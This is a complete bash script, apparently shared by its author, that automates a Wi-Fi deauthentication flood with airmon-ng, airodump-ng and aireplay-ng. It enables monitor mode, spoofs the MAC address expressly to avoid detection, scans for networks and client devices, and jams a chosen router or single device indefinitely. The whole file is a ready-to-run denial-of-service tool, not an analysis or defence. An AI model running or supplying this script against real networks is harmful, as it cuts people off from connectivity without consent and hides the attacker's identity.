#!/bin/bash

##deauth_flood.sh v1.1 by jeremywgleeson
##now with support to scan for and target a specific device on the network. Look up MAC id device correlation on the internet to get a sense for device type
##floods deauthentication packets to a router/specific device


## makes sure it runs as root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   exit 1
fi
clear

## displays available interfaces and then starts the selected interface in monitor mode, killing interfering processes
airmon-ng
echo Enter interface:
read interface
airmon-ng start $interface
airmon-ng check kill
##interface+=mon
interface=mon0

## spoof MAC address to avoid detection
echo Spoofing MAC address
ifconfig $interface down
macchanger -r $interface
ifconfig $interface up


## Show network scan
echo You may wish to enlarge your terminal window so longer wifi names are not truncated. Press return to continue
read
airodump-ng $interface & 
SCANPID=$!
## Scan for 10 seconds and then kill
sleep 10
kill $SCANPID

## Enter information about target network
sleep 1
echo Enter BSSID/MAC address of wifi network
read bssid
echo Enter CH/channel of wifi network
read channel

echo You may wish to enlarge your terminal window so longer wifi names are not truncated. Press return to continue
read

## Scan on designated channel for devices and sets interface to look on said channel
airodump-ng -c $channel $interface & 
SCANPID=$!
sleep 10
kill $SCANPID

## Ask for target
sleep 1
echo Would you like to attack the whole network or a specific device MAC address. Enter new MAC address if you would like to target a device. Otherwise press return
read specific_device

if [[ ! -z $specific_device ]]
then
bssid=$specific_device
fi

## Launches attack
##i=1
##while [ i -le 10 ]
##do
	echo Press ctrl+c to stop the jamming
	aireplay-ng -0 0 -a $bssid $interface
	## For some opening xterms with the attack command doesnt work. If it works for you uncomment it and remove the previous three lines and uncomment the while statment
	##xterm -fn fixed -geom -0-0 -title “Sending packets ($i)” -e ‘aireplay-ng -0 0 -a $bssid $interface’ &
	##let i=$i - 1	
##done

##cleanup stuff. as of now it doesnt run it but if someone can help me learn how to kill aireplay-ng command it would be greatly appreciated
echo Cleaning up processes, killing monitor mode, restarting network manager, reseting MAC address to default
ifconfig $interface down
macchanger -p $interface
ifconfig $interface up
airmon-ng stop $interface
service network-manager start
